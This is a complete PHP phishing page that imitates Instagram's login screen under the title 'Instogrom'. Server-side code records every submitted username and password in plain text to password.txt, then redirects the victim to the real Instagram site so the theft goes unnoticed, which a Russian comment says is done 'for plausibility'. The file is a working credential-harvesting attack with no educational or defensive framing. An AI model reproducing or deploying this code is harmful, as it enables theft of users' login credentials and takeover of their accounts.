<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Формат записи
    $data = "Username: " . $username . " | Password: " . $password . "\n";

    // Сохранение в файл password.txt
    file_put_contents("password.txt", $data, FILE_APPEND);

    // Перенаправление на Instagram (для правдоподобности)
    header("Location: https://www.instagram.com");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="hi.css">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    <title>Instogrom</title>
    <link rel="icon" type="image/png" href="photo/logo.png">
</head>
<body>
<main>
    <img src="photo/screenshot.png" alt="Instagram UI" id="Instagram">
    <div class="form-div">
        <form action="index.php" method="POST">
            <h1 class="insta-logo">Instagram</h1>
            <input type="text" name="username" class="input" placeholder="Phone number, username, or email" required>
            <div class="password-container">
                <input type="password" name="password" class="input" placeholder="Password" required id="password">
                <i class='bx bx-show' id="togglePassword"></i>
            </div>
            <button type="submit" class="login-btn">Log In</button>
            <p id="or">OR</p>
            <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i> Log in with Facebook</a>
        </form>
        <div class="sign-up">
            <p>У вас ещё нет аккаунта? <a href="#" class="sign-link">Sign Up</a></p>
        </div>
        <div class="get-app">
            <p>Get the app</p>
            <div class="store">
                <img src="photo/playstore.png" alt="Play Store" id="play">
                <img src="photo/AppStore.png" alt="App Store" id="microsoft">
            </div>
        </div>
    </div>
</main>
<script>
    document.getElementById("togglePassword").addEventListener("click", function () {
        let passwordField = document.getElementById("password");
        if (passwordField.type === "password") {
            passwordField.type = "text";
            this.classList.replace("bx-show", "bx-hide");
        } else {
            passwordField.type = "password";
            this.classList.replace("bx-hide", "bx-show");
        }
    });
</script>
</body>
</html>
